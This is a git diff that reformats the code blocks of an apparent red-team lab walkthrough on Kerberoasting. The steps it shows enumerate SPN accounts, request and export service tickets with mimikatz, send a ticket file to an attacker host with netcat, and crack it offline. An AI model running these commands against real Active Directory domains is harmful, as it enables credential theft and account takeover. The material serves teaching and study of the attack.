@@ -14,25 +14,21 @@ Note the vulnerable domain member - a user account with `servicePrincipalName` a
 
 Attacker setting up an nc listener to receive a hash for cracking:
 
-{% tabs %}
-{% tab title="attacker@local" %}
+{% code title="attacker@local" %}
 ```csharp
 nc -lvp 443 > kerberoast.bin
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 ### Extracting the Ticket
 
 Attacker enumerating user accounts with `serverPrincipalName` attribute set:
 
-{% tabs %}
-{% tab title="attacker@victim" %}
+{% code title="attacker@victim" %}
 ```csharp
 Get-NetUser | Where-Object {$_.servicePrincipalName} | fl
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 ![](../../.gitbook/assets/kerberoast-enumeration.png)
 
@@ -60,50 +56,42 @@ Additionally, user accounts with SPN set could be extracted with a native window
 
 Attacker requesting a kerberos ticket \(TGS\) for a user account with `servicePrincipalName` set to `HTTP/dc-mantvydas.offense.local`- it gets stored in the memory:
 
-{% tabs %}
-{% tab title="attacker@victim" %}
+{% code title="attacker@victim" %}
 ```csharp
 Add-Type -AssemblyName System.IdentityModel  
 New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "HTTP/dc-mantvydas.offense.local"
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 ![](../../.gitbook/assets/kerberoast-kerberos-token.png)
 
 Using mimikatz, the attacker extracts kerberos ticket from the memory and exports it to a file for cracking:
 
-{% tabs %}
-{% tab title="attacker@victim" %}
+{% code title="attacker@victim" %}
 ```csharp
 mimikatz # kerberos::list /export
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 ![](../../.gitbook/assets/kerberoast-exported-kerberos-tickets.png)
 
 Attacker sends the exported service ticket to attacking machine for offline cracking:
 
-{% tabs %}
-{% tab title="attacker@victim" %}
+{% code title="attacker@victim" %}
 ```csharp
 nc 10.0.0.5 443 < C:\tools\mimikatz\x64\2-40a10000-spotless@HTTP~dc-mantvydas.offense.local-OFFENSE.LOCAL.kirbi
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 ### Cracking the Ticket
 
 Attacker brute forces the password of the service ticket:
 
-{% tabs %}
-{% tab title="attacker@local" %}
+{% code title="attacker@local" %}
 ```csharp
 python2 tgsrepcrack.py pwd kerberoast.bin
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 ![](../../.gitbook/assets/kerberoast-cracked.png)
 
@@ -131,16 +119,14 @@ Out of curiosity, let's decrypt the kerberos ticket since we have the password t
 
 Creating a kerberos keytab file for use in wireshark:
 
-{% tabs %}
-{% tab title="attacker@local" %}
+{% code title="attacker@local" %}
 ```bash
 root@~# ktutil 
 ktutil:  add_entry -password -p HTTP/iis_svc@dc-mantvydas.offense.local -k 1 -e arcfour-hmac-md5
 Password for HTTP/iis_svc@dc-mantvydas.offense.local: 
 ktutil:  wkt /root/tools/iis.keytab
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 ![](../../.gitbook/assets/kerberoast-creating-keytab.png)
 
